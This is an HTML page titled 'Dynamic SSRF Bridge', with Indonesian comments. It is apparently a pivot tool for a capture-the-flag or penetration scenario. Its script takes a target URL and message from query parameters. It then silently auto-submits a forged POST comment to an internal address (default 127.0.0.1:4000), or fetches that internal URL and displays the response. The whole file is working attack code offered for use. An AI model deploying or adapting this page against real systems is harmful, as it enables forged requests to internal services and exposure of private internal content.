<!DOCTYPE html>
<html>
<head>
    <title>Dynamic SSRF Bridge</title>
</head>
<body>
    <div id="status">Processing dynamic request...</div>

    <form id="dynamicForm" method="POST">
        <input type="hidden" id="commentField" name="comment" value="" />
    </form>

    <script>
        // Mengambil parameter dari URL (?target=...&msg=...)
        const urlParams = new URLSearchParams(window.location.search);
        const targetUrl = urlParams.get('target') || 'http://127.0.0.1:4000/';
        const commentMsg = urlParams.get('msg');

        if (commentMsg) {
            // Skenario 1: Kirim data POST otomatis ke blog internal
            document.getElementById('status').innerText = "Submitting POST to " + targetUrl;
            const form = document.getElementById('dynamicForm');
            form.action = targetUrl;
            document.getElementById('commentField').value = commentMsg;
            form.submit();
        } else {
            // Skenario 2: Cukup view-source atau fetch biasa kalau tidak ada parameter 'msg'
            document.getElementById('status').innerText = "Fetching source from " + targetUrl;
            fetch(targetUrl)
                .then(r => r.text())
                .then(data => {
                    document.body.innerHTML = `<pre style="font-family:monospace; white-space:pre-wrap;">${data.replace(/</g, '&lt;')}</pre>`;
                })
                .catch(err => {
                    document.body.innerText = "Error: " + err;
                });
        }
    </script>
</body>
</html>
